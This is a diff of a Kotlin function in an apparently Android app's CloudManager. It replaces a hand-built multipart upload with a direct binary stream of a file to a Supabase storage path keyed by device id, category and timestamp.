@@ -247,59 +247,31 @@ object CloudManager {
     suspend fun uploadFile(ctx: Context, file: java.io.File, category: String = "GENERAL"): Boolean {
         return withContext(Dispatchers.IO) {
             try {
-                DebugLogger.log("CLOUD", "Starting Stream Upload: ${file.name}")
                 val deviceId = DeviceManager.getDeviceId(ctx)
+                val timestamp = System.currentTimeMillis()
+                // Construct direct storage path: device_id/category/timestamp_filename
+                val storagePath = "$deviceId/$category/${timestamp}_${file.name}"
                 
-                val supabaseUrl = SecretVault.getUploaderUrl(ctx)
+                val supabaseUrl = SecretVault.getStorageUrl(ctx, "cortex-vault", storagePath)
                 val supabaseKey = SecretVault.getLock(ctx)
-                val boundary = "*****CortexBoundary${System.currentTimeMillis()}*****"
-                val twoHyphens = "--"
-                val crlf = "\r\n"
+
+                DebugLogger.log("CLOUD", "Direct Storage Pipe Open: ${file.name}")
 
                 val url = URL(supabaseUrl)
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("apikey", supabaseKey)
                 conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
-                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+                conn.setRequestProperty("Content-Type", "application/octet-stream")
                 conn.doOutput = true
                 
-                // CRITICAL FOR MEMORY: Prevents Android from loading the whole file into RAM to calculate Content-Length
-                conn.setChunkedStreamingMode(4096) 
+                // Tell the OS we're streaming binary data directly
+                conn.setFixedLengthStreamingMode(file.length())
 
-                conn.outputStream.use { os ->
-                    val writer = os.writer()
-                    
-                    // Part 1: Device ID
-                    writer.append(twoHyphens).append(boundary).append(crlf)
-                    writer.append("Content-Disposition: form-data; name=\"deviceId\"").append(crlf).append(crlf)
-                    writer.append(deviceId).append(crlf)
-                    
-                    // Part 2: Category
-                    writer.append(twoHyphens).append(boundary).append(crlf)
-                    writer.append("Content-Disposition: form-data; name=\"category\"").append(crlf).append(crlf)
-                    writer.append(category).append(crlf)
-                    
-                    // Part 3: File
-                    writer.append(twoHyphens).append(boundary).append(crlf)
-                    writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"").append(crlf)
-                    writer.append("Content-Type: application/octet-stream").append(crlf).append(crlf)
-                    writer.flush()
-                    
-                    // Stream the file bits directly from disk to network socket (8KB chunks)
-                    file.inputStream().use { input ->
-                        val buffer = ByteArray(8192)
-                        var bytesRead: Int
-                        while (input.read(buffer).also { bytesRead = it } != -1) {
-                            os.write(buffer, 0, bytesRead)
-                        }
+                file.inputStream().use { input ->
+                    conn.outputStream.use { output ->
+                        input.copyTo(output, 8192)
                     }
-                    os.flush()
-                    writer.append(crlf)
-                    
-                    // End Boundary
-                    writer.append(twoHyphens).append(boundary).append(twoHyphens).append(crlf)
-                    writer.flush()
                 }
                 
                 val code = conn.responseCode
